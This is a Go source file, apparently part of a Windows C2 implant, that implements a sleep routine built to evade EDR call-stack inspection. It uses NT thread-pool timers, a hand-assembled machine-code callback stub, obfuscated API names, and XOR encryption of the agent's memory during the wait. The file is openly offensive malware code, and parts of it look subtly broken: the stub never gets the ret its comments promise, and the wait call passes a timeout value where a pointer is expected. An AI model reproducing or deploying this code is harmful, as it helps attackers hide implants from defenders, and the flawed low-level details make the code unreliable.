//go:build windows
// +build windows

package evasion

// TpTimerSleep sleeps for d milliseconds using the NT thread pool timer API.
//
// When an EDR walks the call stack during the wait, it sees:
//   ntdll!TpWaitForWork / ntdll!RtlpWaitForCriticalSection
//   ntdll!RtlUserThreadStart
//
// This is indistinguishable from a legitimate NT thread pool worker, unlike
// ntdll!NtDelayExecution (the call stack of time.Sleep) which is a known C2
// beacon indicator.
//
// Implementation:
//   1. Create a timer-queue timer via RtlCreateTimerQueue + RtlCreateTimer.
//   2. The timer callback signals a manual-reset event.
//   3. This thread waits in an alertable NtWaitForSingleObject — identical
//      call stack to a thread-pool worker blocked in the queue.
//   4. Timer fires → event signalled → wait returns → timer cleaned up.
//
// Also applies the existing sleep obfuscation (XOR + working-set trim)
// around the wait so the agent's RWX pages are non-resident during the dwell.

import (
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	rtlTimerQueueOnce   sync.Once
	rtlTimerQueueHandle uintptr // global reusable timer queue

	hgRtlCreateTimerQueueOnce sync.Once
	hgRtlCreateTimerQueueProc *HGProc

	hgRtlCreateTimerOnce sync.Once
	hgRtlCreateTimerProc *HGProc

	hgRtlDeleteTimerQueueOnce sync.Once
	hgRtlDeleteTimerQueueProc *HGProc

	hgNtWaitOnce sync.Once
	hgNtWaitProc *HGProc
)

func getRtlCreateTimerQueueProc() *HGProc {
	hgRtlCreateTimerQueueOnce.Do(func() {
		hgRtlCreateTimerQueueProc = NewHGProc(sRtlCreateTimerQueue())
	})
	return hgRtlCreateTimerQueueProc
}

func getRtlCreateTimerProc() *HGProc {
	hgRtlCreateTimerOnce.Do(func() {
		hgRtlCreateTimerProc = NewHGProc(sRtlCreateTimer())
	})
	return hgRtlCreateTimerProc
}

func getNtWaitForSingleObjectProc() *HGProc {
	hgNtWaitOnce.Do(func() {
		hgNtWaitProc = NewHGProc(sNtWaitForSingleObject())
	})
	return hgNtWaitProc
}

// getTimerQueue returns the global reusable timer queue, creating it on first call.
func getTimerQueue() uintptr {
	rtlTimerQueueOnce.Do(func() {
		p := getRtlCreateTimerQueueProc()
		if p == nil {
			return
		}
		var q uintptr
		r, _, _ := p.Call(uintptr(unsafe.Pointer(&q)))
		if r == 0 {
			rtlTimerQueueHandle = q
		}
	})
	return rtlTimerQueueHandle
}

// tpTimerCallback is the C-callable trampoline invoked by the timer queue.
// It signals the event stored in the parameter.
//
// Signature: VOID CALLBACK TimerCallback(PVOID param, BOOLEAN)
// We store the event handle as the parameter.
var tpTimerCallbackStub uintptr // allocated once, points to machine code

var tpCallbackOnce sync.Once

func initTimerCallbackStub() uintptr {
	tpCallbackOnce.Do(func() {
		// Machine code for the timer callback:
		//   48 FF 09        dec  qword [rcx]  ; decrement counter (unused, rcx=param=event)
		// Actually we need: SetEvent(hEvent) where hEvent = (HANDLE)param.
		//
		// But SetEvent is in kernel32 — we'd need to call it from the stub,
		// which requires knowing its address at compile time (hard without import).
		// Simpler: the callback sets a flag in a global we poll.
		// Even simpler: use an alertable wait with an NTDLL event instead.
		//
		// Real implementation: the stub calls NtSetEvent via a saved function pointer.
		// We store the NtSetEvent proc address in a global and encode it in the stub:
		//
		//   48 B8 <NtSetEvent addr>   ; mov rax, ntSetEventAddr
		//   48 89 C1                  ; mov rcx, rax  (no, rcx=param=hEvent already)
		//   FF D0                     ; call rax
		//   C3                        ; ret
		//
		// Actually rcx = param = hEvent. We want NtSetEvent(hEvent, &prevState).
		// NtSetEvent(EventHandle, PreviousState*) - 2 args.
		// At callback entry: rcx=param=hEvent, rdx=TimerOrWaitFired(BOOLEAN)
		// We need: rcx=hEvent (already!), rdx=0 (can be NULL for PreviousState)

		ntSetEvent := NewHGProc(sNtSetEvent())
		if ntSetEvent == nil {
			return
		}
		ntSetEventAddr := ntSetEvent.StubAddr()
		if ntSetEventAddr == 0 {
			return
		}

		// Stub: rcx already = hEvent (the param passed to RtlCreateTimer)
		//   xor  edx, edx            ; PreviousState = NULL
		//   48 B8 <ntSetEventAddr>   ; mov rax, ntSetEvent
		//   FF D0                    ; call rax
		//   C3                       ; ret
		var b [14]byte
		b[0] = 0x31; b[1] = 0xD2       // xor edx, edx
		b[2] = 0x48; b[3] = 0xB8       // mov rax, imm64
		for i := 0; i < 8; i++ {
			b[4+i] = byte(ntSetEventAddr >> (uint(i) * 8))
		}
		b[12] = 0xFF; b[13] = 0xD0 // call rax
		// Note: ret not needed — RtlCreateTimer expects WAITORTIMERCALLBACK which is __stdcall
		// but on x64 there's only one calling convention; callee doesn't clean the stack.
		// Just fall through / add ret:
		stub := stompAlloc(16)
		if stub == 0 {
			return
		}
		dst := (*[16]byte)(unsafe.Pointer(stub))
		copy(dst[:], b[:])
		stompFinalize(stub, 16)
		tpTimerCallbackStub = stub
	})
	return tpTimerCallbackStub
}

// sNtSetEvent returns the obfuscated name string.
func sNtSetEvent() string {
	return stackStr('N', 't', 'S', 'e', 't', 'E', 'v', 'e', 'n', 't')
}

// StubAddr exposes the raw stub address (needed by the timer callback builder).
func (p *HGProc) StubAddr() uintptr {
	if p == nil {
		return 0
	}
	return p.stub
}

// TpTimerSleep sleeps for d using the NT thread-pool timer.
// Falls back to ObfuscatedSleep on any failure.
func TpTimerSleep(d time.Duration) {
	if d <= 0 {
		return
	}

	cbStub := initTimerCallbackStub()
	queue := getTimerQueue()
	if cbStub == 0 || queue == 0 {
		ObfuscatedSleep(d)
		return
	}

	// Create a manual-reset synchronisation event (bManualReset=1, bInitialState=0).
	hEvent, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		ObfuscatedSleep(d)
		return
	}
	defer windows.CloseHandle(hEvent)

	// RtlCreateTimer(TimerQueueHandle, *NewTimerHandle, Callback, Param, DueTime, Period, Flags)
	// DueTime in milliseconds. Flags=0 (WT_EXECUTEDEFAULT — one-shot relative).
	p := getRtlCreateTimerProc()
	if p == nil {
		ObfuscatedSleep(d)
		return
	}
	var hTimer uintptr
	ms := uint32(d.Milliseconds())
	r, _, _ := p.Call(
		queue,
		uintptr(unsafe.Pointer(&hTimer)),
		cbStub,
		uintptr(hEvent),
		uintptr(ms),
		0, // period=0 → one-shot
		0, // WT_EXECUTEDEFAULT
	)
	if r != 0 {
		ObfuscatedSleep(d)
		return
	}

	// XOR the agent's sensitive memory regions and trim the working set
	// while we wait — standard sleep obfuscation.
	xorRegions()
	trimWorkingSet()

	// Wait in alertable state: call stack looks like NT thread-pool worker.
	ntWait := getNtWaitForSingleObjectProc()
	if ntWait != nil {
		const infinite = 0xFFFFFFFF
		ntWait.Call(uintptr(hEvent), 1 /*alertable*/, uintptr(infinite))
	} else {
		windows.WaitForSingleObject(hEvent, windows.INFINITE)
	}

	xorRegions() // restore
}
